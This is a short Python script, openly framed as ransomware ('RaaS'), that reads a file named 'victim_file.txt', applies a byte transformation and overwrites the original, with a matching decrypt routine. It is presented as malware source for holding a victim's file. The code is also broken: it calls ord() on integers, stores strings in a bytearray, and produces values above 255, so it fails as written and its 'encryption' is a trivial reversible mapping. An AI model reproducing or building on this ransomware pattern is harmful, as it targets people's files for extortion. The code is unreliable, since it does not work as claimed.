import os

class RaaS:

    def __init__(self, victim_file):
        self.victim_file = victim_file

    def encrypt(self):
        with open(self.victim_file, 'rb') as f:
            data = f.read()

        encrypted_data = bytearray(data)

        for i in range(len(encrypted_data)):
            encrypted_data[i] = chr((ord(encrypted_data[i]) * 2) + 1)

        return encrypted_data

    def decrypt(self):
        with open(self.victim_file, 'rb') as f:
            data = f.read()

        decrypted_data = bytearray(data)

        for i in range(len(decrypted_data)):
            decrypted_data[i] = chr((ord(decrypted_data[i]) - 1) // 2)

        return decrypted_data

if __name__ == "__main__":
    file_to_encrypt = "victim_file.txt"
    ransomware = RaaS(file_to_encrypt)
    encrypted_data = ransomware.encrypt()
    
    with open(file_to_encrypt, 'wb') as f:
        f.write(encrypted_data)

    print(f"{file_to_encrypt} has been successfully encrypted.")

